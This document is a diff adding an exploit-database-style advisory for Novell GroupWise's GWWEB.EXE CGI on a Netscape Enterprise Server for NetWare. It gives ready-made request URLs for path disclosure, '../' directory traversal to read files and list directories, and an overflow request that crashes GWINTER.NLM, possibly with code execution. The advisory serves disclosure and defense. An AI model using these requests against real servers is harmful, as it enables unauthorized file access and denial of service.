@@ -1,0 +1,25 @@
+Netscape Enterprise Server for NetWare 4/5 3.0.7 a,Novell Groupwise 5.2/5.5 GWWEB.EXE Multiple Vulnerabilities
+
+source: http://www.securityfocus.com/bid/879/info
+
+The HELP function in GWWEB.EXE will reveal the path of the server, and combined with the '../' string, allow read access for any client to any .htm file on the server, as well as browseable directory listings.
+
+Also, it is possible to abend GWINTER.NLM by specifying a long string where the server expects a variable setting. 
+
+Requesting the following URL from the GroupWise server
+http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=asdf
+will return the error message:
+Could not read file SYS:WEB\CGI-BIN\GW5\US\HTML3\HELP\ASDF.HTM
+revealing the full path of the GroupWise server software.
+Note: The URL above may need to be tailored to the target system.
+
+To read .htm files anywhere on the server, or to browse directories, use HELP and the ../ string to traverse directories, for example:
+http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=../../../secret.htm
+or
+http ://victimhost/cgi-bin/GW5/GWWEB.EXE?HELP=../../../
+Again, the paths shown above may need to be modified.
+
+To abend GWINTER.NLM request a URL like:
+http ://victimhost/cgi-bin/GW5/GWWEB.EXE?[512+ chars]
+It may be possible to remotely execute arbitrary code via this buffer overflow.
+
